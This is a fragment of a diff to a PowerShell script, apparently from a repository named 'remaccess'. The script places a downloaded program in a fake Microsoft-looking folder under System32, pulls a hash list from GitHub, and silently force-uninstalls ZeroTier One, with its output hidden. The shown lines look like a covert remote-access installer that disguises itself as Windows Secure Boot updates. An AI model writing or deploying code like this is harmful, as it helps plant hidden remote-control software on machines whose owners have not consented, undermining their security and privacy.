@@ -5,8 +5,8 @@ $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 #Code starts Here
-Install-PackageSource -Name NuGet -Location "https://www.nuget.org/api/v2/" -ProviderName NuGet -Trusted -Force
-Uninstall-Package -Name "ZeroTier One" -Force
+Install-PackageProvider -Name NuGet -Force | Out-Null
+Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
